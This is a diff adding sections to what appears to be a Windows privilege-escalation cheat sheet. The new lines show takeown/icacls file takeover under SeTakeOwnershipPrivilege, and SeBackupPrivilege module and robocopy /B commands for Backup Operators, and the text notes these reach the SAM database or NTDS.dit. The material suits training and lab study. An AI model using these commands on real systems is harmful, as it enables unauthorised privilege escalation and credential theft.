@@ -10,6 +10,7 @@ You can list your privileges with the command below, **but**, you won't see all 
 
 ```shell!
 PS> whoami /priv
+PS> # your groups can have privileges too!
 ```
 
 Privileges are [listed and explained here](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants).
@@ -78,6 +79,48 @@ PS> [MyProcess]::CreateProcessFromParent(<target_process_pid>,"<command_to_execu
 ```
 
 ➡️ See also: [PrivFu/SeDebugPrivilegePoC](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC).
+</div><div>
+
+#### SeTakeOwnershipPrivilege — Takeover Any File/Folder
+
+[![windows_privilege_escalation](../../../../_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)
+
+You could access the SAM database or NTDS.dit...
+
+```shell!
+PS> takeown /f 'C:\poc.txt'
+PS> icacls 'C:\poc.txt' /grant my_username:F
+```
+</div></div>
+
+<hr class="sep-both">
+
+## GroupToAdmin
+
+<div class="row row-cols-lg-2"><div>
+
+#### Backup Operators — Access any file
+
+[![windows_privilege_escalation](../../../../_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)
+
+*-- Grants SeBackup and SeRestore privileges --*
+
+We can use [SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege) <small>(0.2k ⭐, 2013 🪦)</small> to enable/disable the privilege and exploit it.
+
+```shell!
+PS> Import-Module .\SeBackupPrivilegeUtils.dll
+PS> Import-Module .\SeBackupPrivilegeCmdLets.dll
+PS> Get-SeBackupPrivilege # is enabled?
+PS> Set-SeBackupPrivilege # enable it
+```
+
+We can use `robocopy` to perform a backup copy:
+
+```shell!
+PS> robocopy /B <source_folder> <dest_folder> <filename>
+```
+
+You could access the SAM database or NTDS.dit...
 </div><div>
 </div></div>
 
